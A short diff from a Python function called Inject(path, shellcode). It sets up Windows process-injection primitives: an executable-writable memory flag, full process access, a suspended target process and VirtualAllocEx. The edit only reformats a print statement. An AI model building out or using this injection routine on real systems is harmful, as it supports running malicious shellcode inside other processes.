@@ -770,8 +770,9 @@ def Inject(path, shellcode):
     page_rwx_value = 0x40
     process_all = 0x1F0FFF
     memcommit = 0x00001000
+
     if info[0].handle > 0 :
-       print('[+] - Created ', path, 'Suspended')
+       print(f'[+] - Created {path} Suspended')
     shellcode_length = len(shellcode)
     process_handle = info[0].handle  # phandle
     VirtualAllocEx = windll.kernel32.VirtualAllocEx
